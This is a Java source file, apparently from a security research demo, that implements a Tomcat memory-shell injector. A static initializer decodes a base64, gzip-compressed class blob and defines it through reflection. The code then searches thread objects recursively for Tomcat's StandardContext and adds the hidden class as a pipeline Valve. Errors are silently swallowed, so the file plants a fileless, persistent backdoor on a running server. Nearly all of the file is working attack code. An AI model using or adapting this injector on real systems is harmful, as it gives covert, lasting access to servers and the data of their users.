package com.demo.memshell.exec.valve;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 */
public class TomcatValueThreadLoader {
    private static String gzipObject = "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";
    private static Object object = null;

    public TomcatValueThreadLoader() {
    }

    static {
        try {
            getObject();

            // 获取 standardContext
            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
            if (!isInject(standardContext)) {
                inject(standardContext);
            }

        } catch (Throwable e) {

        }
    }

    public static boolean isInject(Object standardContext) {
        try {
            Object pipeline = getFieldValue(standardContext, "pipeline");
            Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", new Class[]{}, new Object[]{});
            for (Object valve : valves) {
                if (valve.getClass().getName().equals(object.getClass().getName())) {
                    return true;
                }
            }
        } catch (Exception e) {

        }

        return false;
    }

    public static void inject(Object standardContext) {
        try {
            if (object == null)
                return;
            Object pipeline = getFieldValue(standardContext, "pipeline");
            invokeMethod(pipeline, "addValve", new Class[]{Class.forName("org.apache.catalina.Valve")}, new Object[]{object});
        } catch (Exception e) {

        }
    }

    public static void getObject() throws Exception {
        byte[] bytes = decompress(gzipObject);

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = null;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defMethod.setAccessible(true);
            Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
            String CLASSNAME = cls.getName();

            clazz = classLoader.loadClass(CLASSNAME);
        }
        Object javaObject = clazz.newInstance();
        object = javaObject;
    }

//    public static void getObject() throws Exception {
//
//    }

    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new TomcatValueThreadLoader().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }

}
